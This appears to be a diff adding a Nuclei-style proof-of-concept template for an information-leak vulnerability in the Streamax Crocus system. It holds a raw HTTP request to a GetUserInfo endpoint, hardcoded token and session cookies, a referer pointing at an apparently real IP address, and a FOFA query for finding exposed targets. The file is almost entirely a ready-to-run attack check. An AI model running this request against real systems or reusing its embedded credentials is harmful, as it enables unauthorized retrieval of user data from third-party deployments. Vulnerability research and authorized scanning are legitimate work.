@@ -1,0 +1,37 @@
+id: poc-rqrnlnnf24hf81vv
+info:
+  name: 锐明Crocus系统存在敏感信息泄漏漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rqrnlnnf24hf81vv'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rqrnlnnf24hf81vv
+    fofa: body="inp_verification"
+http:
+- raw:
+  - 'GET /Home.do?Action=GetUserInfo&Type=Get&Guid=1724206435273 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+
+    Token: d2JzczoxNzI0MjA2NDIwNzU2
+
+    Referer: [http://222.208.183.9:8000/Plugin/SystemConfig/Default.jsp?1724206423823](http://222.208.183.9:8000/Plugin/SystemConfig/Default.jsp?1724206423823)
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: JSESSIONID=234DBD0F52D9D798CB9931DEDA75131A; Saffron.U=VUlEPTEmVU49Y3JvY3VzJkdJRD0xNzI0MjA3NDQ5NTI2ODYmUklEPTEmTT1CTWFwJklOUz0x
+
+    X-Requested-With: XMLHttpRequest'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
